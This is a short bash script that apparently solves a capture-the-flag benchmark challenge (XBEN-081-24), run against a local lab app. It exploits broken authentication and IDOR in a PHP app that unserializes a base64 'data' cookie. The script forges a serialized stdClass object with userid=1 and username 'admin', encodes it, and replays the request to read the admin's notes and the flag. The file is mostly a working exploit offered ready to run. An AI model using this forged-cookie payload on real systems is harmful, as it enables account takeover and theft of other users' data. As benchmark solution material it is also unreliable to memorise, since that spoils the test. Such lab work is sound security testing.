#!/usr/bin/env bash
# XBEN-081-24 — broken auth + IDOR via an unserialized cookie. Proxy-mode twin.
# index.php authenticates on the mere presence of a `data` cookie, then does
# `unserialize(base64_decode($_COOKIE['data']))` and uses `$obj->userid` directly
# in `SELECT * FROM notes WHERE user_id=?`. No signature, no session — so a
# serialized object with userid=1 reads the admin's notes, one of which is the
# flag.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
VICTIM="${2:-1}"
SESSION="xben081p-$$"; cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"; go "$URL/"; BASE="$(req_of GET /)"
# serialized stdClass {userid=VICTIM, username="admin"}, base64 for the cookie
DATA="$(python3 -c "import base64,sys;u=sys.argv[1];s='O:8:\"stdClass\":2:{s:6:\"userid\";i:%s;s:8:\"username\";s:5:\"admin\";}'%u;print(base64.b64encode(s.encode()).decode())" "$VICTIM")"
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=GET' --set 'path=/index.php' --set "cookie.data=$DATA" >/dev/null
print_flag
